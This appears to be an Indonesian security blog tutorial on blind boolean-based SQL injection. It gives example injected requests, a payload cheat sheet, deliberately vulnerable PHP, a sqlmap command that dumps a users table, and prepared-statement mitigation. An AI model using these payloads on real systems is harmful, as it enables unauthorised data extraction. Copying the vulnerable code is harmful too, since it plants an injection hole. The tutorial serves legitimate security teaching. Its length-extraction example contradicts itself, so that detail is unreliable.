---
title: "SQL Injection — Blind Boolean-Based"
date: 2026-04-15T01:00:01+07:00
draft: false
author: "Andrew"
summary: "Blind Boolean-Based SQL Injection adalah teknik di mana attacker menyelidiki respons aplikasi untuk membedakan apakah sebuah kondisi adalah TRUE atau FALSE, memungkinkan mereka untuk mengekstrak data satu karakter pada satu waktu."
tags: ["Web Penetration Testing", "SQL Injection", "Blind Boolean-Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# SQL Injection — Blind Boolean-Based

## Apa Itu Blind Boolean-Based SQLi?

Tidak semua SQL injection memberikan output yang bisa langsung dilihat attacker. Kadang aplikasi tidak menampilkan hasil query, response-nya hanya "Yes/No", "Found/Not Found", atau bahkan tidak ada perubahan visual sama sekali.

Di sinilah **Blind Boolean-Based SQLi** masuk. Alih-alih melihat data secara langsung, attacker menyelidiki respons aplikasi untuk membedakan apakah sebuah kondisi adalah TRUE atau FALSE. Dengan bertanya ribuan pertanyaan binary, attacker bisa memaksa aplikasi membocorkan data satu karakter pada satu waktu.

Bayangkan memainkan game 20 questions, tapi aplikasi adalah oracle yang menjawab dengan mengubah tampilan halaman.

---

## Cara Kerjanya

**Konsep Dasar:**

Attacker mengirim payload yang memaksa aplikasi menjawab secara berbeda berdasarkan kondisi yang disuntikkan. Perubahan response, entah teks, kode status, atau ada/tidaknya elemen adalah cluenya.

**Contoh:**

```
Normal request:
GET /product?id=1 → Returns product details (200 OK)

Malicious (TRUE condition):
GET /product?id=1 AND 1=1 → Returns product details (200 OK)

Malicious (FALSE condition):
GET /product?id=1 AND 1=2 → Different response (403 Forbidden or empty)
```

**Jika AND 1=1 mengembalikan hasil normal, tetapi AND 1=2 memberikan response berbeda, berarti aplikasi vulnerable terhadap blind boolean SQLi.**

---

## Exploitation: Character-by-Character Extraction

Dengan response differential ini, attacker bisa ekstrak data karakter demi karakter:

```
Step 1: Cari panjang username pertama
GET /product?id=1 AND (SELECT LENGTH(username) FROM users LIMIT 1) > 5 --
→ 200 OK (True, panjang > 5)
GET /product?id=1 AND (SELECT LENGTH(username) FROM users LIMIT 1) > 10 --
→ 200 OK (True, panjang > 10)
GET /product?id=1 AND (SELECT LENGTH(username) FROM users LIMIT 1) > 15 --
→ 403 Forbidden (False, panjang ≤ 15)
...continue until exact length found (e.g., 8)

Step 2: Ekstrak karakter demi karakter
GET /product?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a' --
→ 403 (False, bukan 'a')
GET /product?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'b' --
→ 200 OK (True! Karakter pertama adalah 'b')
GET /product?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'c' --
→ 403 (False, bukan 'c')
... continue for all 8 characters
```

**Flow Diagram:**

```
┌─────────────────────────────────────────────────────────────┐
│  Attacker: "Apakah karakter pertama = 'a'?"                │
│  Payload: AND (SELECT SUBSTRING(pwd,1,1) FROM users)='a'    │
│                                                             │
│              ┌─────────────┐                               │
│              │  Web App     │                               │
│              │  executes:  │                               │
│              │  WHERE id=1  │                               │
│              │  AND FALSE   │                               │
│              └──────┬──────┘                               │
│                     │                                       │
│              ┌──────▼──────┐                               │
│              │  Response: │                               │
│              │  403 Not   │◄── "FALSE condition"          │
│              │  Found     │                               │
│              └─────────────┘                               │
│                                                             │
│  Attacker: "Bukan 'a'. Coba 'b'..."                         │
│  Payload: AND (SELECT SUBSTRING(pwd,1,1) FROM users)='b'   │
│                                                             │
│              ┌─────────────┐                               │
│              │  Response: │                               │
│              │  200 OK     │◄── "TRUE condition!"          │
│              │  Product    │                               │
│              └─────────────┘                               │
│                                                             │
│  "Karakter pertama = 'b'!" ➜ Record, move to position 2    │
└─────────────────────────────────────────────────────────────┘
```

---

## Contoh Vulnerable Code

**PHP:**

```php
$product_id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $product_id";
$result = mysqli_query($conn, $query);
$product = mysqli_fetch_assoc($result);

if ($product) {
    echo "<h1>" . $product['name'] . "</h1>";
} else {
    echo "Product not found";
}
```

Tidak ada data yang dikembalikan ke attacker secara langsung, hanya "Product not found" atau menampilkan produk. Tapi query-nya masih vulnerable.

---

## Automasi dengan sqlmap

```bash
# Deteksi dan eksploitasi blind boolean SQLi
sqlmap -u "https://example.com/product?id=1" \
       --technique=B \
       --batch \
       --dump \
       -T users

# Penjelasan parameter:
# --technique=B  → Gunakan Blind Boolean
# --batch        → Auto-confirm prompts
# --dump         → Ekstrak seluruh data tabel
# -T users       → Target tabel users
```

---

## Mitigasi

```php
// Secure: Menggunakan Prepared Statements
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $product_id);
$stmt->execute();
$result = $stmt->get_result();
```

**Prinsip umum:**
```
✅ Prepared Statements — satu-satunya cara yang benar
✅ Input validation + type casting
✅ Error handling yang tidak membocorkan info
✅ Least privilege untuk database user
```

---

## Cheat Sheet

| Purpose | Payload Pattern |
|---------|----------------|
| True condition | `AND 1=1` |
| False condition | `AND 1=2` |
| Get string length | `AND (SELECT LENGTH(col) FROM table LIMIT 1) > N` |
| Extract character | `AND (SELECT SUBSTRING(col,1,1) FROM table LIMIT 1) = 'a'` |
| ASCII comparison | `AND ASCII(SUBSTRING(col,1,1)) > 100` |
| Binary search | `AND ASCII(SUBSTRING(col,1,1)) BETWEEN 48 AND 122` |

---

## Perbedaan dengan Jenis Lain

| Type | Output Visible? | Requires Visible Error? | Speed |
|------|-----------------|------------------------|-------|
| Union-Based | Ya | Tidak | Fast |
| Error-Based | Tidak | Ya | Fast |
| Blind Boolean | Tidak | Tidak | Slow (char by char) |
| Blind Time-Based | Tidak | Tidak | Slow (depends on sleep) |

---

## Referensi

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap time-based blind injection](https://github.com/sqlmapproject/sqlmap/wiki/Usage#time-based-blind)
